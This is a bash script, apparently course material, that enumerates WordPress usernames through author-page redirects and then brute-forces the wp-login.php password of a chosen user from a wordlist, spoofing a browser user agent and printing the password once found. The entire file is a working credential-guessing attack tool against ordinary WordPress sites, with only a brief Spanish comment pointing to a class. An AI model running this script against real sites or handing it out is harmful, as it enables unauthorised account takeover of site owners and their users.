# Enumeracion de usuarios de Wordpress, y bruteforce.
#
#!/bin/bash

USER_AGENT="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0"
TIMEOUT=1
COOKIE=cookie-`date +%s` # Date in seconds since 1970-01-01 00:00:00 UTC
COOKIE_PATH="/tmp/$COOKIE"

# Command help
help_man(){
	echo -e "Arguments:\n\t--url\t\t Wordpress URL\n\t--user\t\t Wordpress Username\n\t--wordlist\t\t Path to wordlist\n"
	echo -e "User enumeration:\n./wpbrute.sh --url www.example.com\n\nPassword Bruteforce:\n./wpbrute.sh --url www.example.com --user admin --wordlist wordlist.txt"
}

# Test wordpress URL
test_url(){
	CHECK_URL=`curl -o /dev/null -s -I -w '%{http_code}\n' $WP_URL/wp-login.php`
	if [ "$CHECK_URL" -ne 200 ]; then echo -e "URL Error: $WP_URL\nHTTP CODE: $CHECK_URL"; exit; fi
}


# User Enumerations

user_enum(){
	echo "[+] Username or nickname enumeration"
	for i in {1..5}
	do
		curl -s -A "$USER_AGENT" -L -i $WP_URL/?author=$i | grep -E -o "title=\"View all posts by [a-z0-9A-Z\-\.]*.*\"|Location:*" | sed 's/\// /g' | grep -o "author *" | sed 's/author //g' | sed 's/\"//g' | grep -v "^$"
	done
	exit
}

# Se continua en clase numero 4...

#
#
# +++++++++++++++++++++ START +++++++++++++++++++++++
#
#
#
# GET Arguments
#
args_array=( $@ )
len_args=${#args_array[@]}

# If only 1 argument is passed (which will be --url), then we are doing a User Enumeration.

### User enumration ###
if [ "$len_args" -eq 1 ];
then
	WP_URL=`echo $@ | grep -o "\-\-url=.*" | cut -d\= -f2 | cut -d" " -f1`
	test_url
	user_enum
fi

# If 3 arguments are passed (which will be --url, --user, --wordlist, then we are doing
# password bruteforcing.

### Password bruteforcing ###
if [ "$len_args" -ne 3 ];
then
	help_man
	exit
else
# Get value
	WP_ADMIN=`echo $@ | grep -o "\-\-user=.*" | cut -d\= -f2 | cut -d" " -f1`
	WP_PASSWORD=`echo $@ | grep -o "\-\-wordlist=.*" | cut -d\= -f2 | cut -d" " -f1`
	if [ ! -f "$WP_PASSWORD" ]; 
	then
		echo "The wordlist file does not exist...$WP_PASSWORD"
		exit
	fi
	WP_URL=`echo $@ | grep -o "\-\-url=.*" | cut -d\= -f2 | cut -d" " -f1`
	test_url
fi

# Get cookie (or all cookies, and stored them in a file).

curl  -s -A "$USER_AGENT" -c "$COOKIE_PATH" $WP_URL/wp-login.php > /dev/null # We dont care
# about its output, we only need to save the cookies received by requesting that path.

## Bruteforce Start ##
echo "[+] Bruteforcing user [$WP_ADMIN]"
cat "$WP_PASSWORD" | while read line;
	do {
		echo $line
		REQ=`curl -s -b "$COOKIE_PATH" -A "$USER_AGENT" --connect-timeout $TIMEOUT -d log="$WP_ADMIN" -d pwd="$line" -d wp-submit="Log In" -d redirect_to="$WP_URL/wp-admin" -d testcookie=1 $WP_URL/wp-login.php`
		if [ "$REQ" == "" ];
		then
			echo "The password is: $line"
			rm "$COOKIE_PATH"
			exit
		fi

	}
	done

# Remove cookie
rm "$COOKIE_PATH" 2> /dev/null
